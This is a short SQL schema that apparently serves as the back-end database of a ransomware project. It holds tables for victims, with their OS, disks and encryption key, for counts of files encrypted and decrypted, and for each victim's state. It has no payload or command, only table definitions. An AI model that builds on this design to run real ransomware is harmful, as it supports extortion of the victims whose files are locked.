drop table if exists decrypted;
drop table if exists encrypted;
drop table if exists states;
drop table if exists victims;

CREATE TABLE victims (
    id_victim INTEGER PRIMARY KEY,
    os VARCHAR NOT NULL,
    hash VARCHAR NOT NULL,
    disks VARCHAR NOT NULL,
    key VARCHAR NOT NULL
);

CREATE TABLE decrypted (
    id_decrypted INTEGER PRIMARY Key,
    id_victim INTEGER,
    datetime TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    nb_files INTEGER,
    FOREIGN KEY (id_victim) REFERENCES victims(id_victim)
);

CREATE TABLE states (
    id_state INTEGER PRIMARY KEY,
    id_victim INTEGER,
    datetime TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    state VARCHAR NOT NULL,
    FOREIGN KEY (id_victim) REFERENCES victims(id_victim)
);

CREATE TABLE encrypted (
    id_encrypted INTEGER PRIMARY Key,
    id_victim INTEGER,
    datetime TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    nb_files INTEGER,
    FOREIGN KEY (id_victim) REFERENCES victims(id_victim)
);